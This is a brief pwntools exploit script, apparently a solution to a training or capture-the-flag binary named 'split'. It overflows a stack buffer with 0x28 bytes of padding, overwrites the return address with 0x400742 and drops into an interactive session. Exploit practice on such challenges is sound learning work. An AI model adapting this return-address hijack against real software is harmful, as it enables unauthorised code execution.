from pwn import *

io = process('./split')

payload = b'\x66'*0x28
payload += p64(0x400742)

io.sendlineafter('> ', payload)
io.recvline()
io.interactive()
